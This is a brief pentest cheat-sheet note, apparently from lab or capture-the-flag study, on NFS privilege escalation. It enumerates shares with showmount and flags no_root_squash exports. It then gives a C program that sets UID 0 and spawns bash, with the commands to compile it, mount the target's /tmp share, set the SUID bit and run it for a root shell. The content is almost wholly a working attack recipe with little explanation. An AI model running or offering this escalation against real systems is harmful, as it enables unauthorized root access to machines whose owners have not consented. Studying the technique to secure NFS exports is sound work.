# Miscellaneous Techniques (NFS)

```bash
showmount -e <IP>

/tmp *(rw,no_root_squash)
/var/nfs/general *(rw,no_root_squash)
# no_root_squash -> that's meaning u have toot perm in all machines
```

```c
// exploit code
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void) {
  setuid(0); setgid(0); system("/bin/bash");
}

```

```c
gcc -static shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
./shell
```
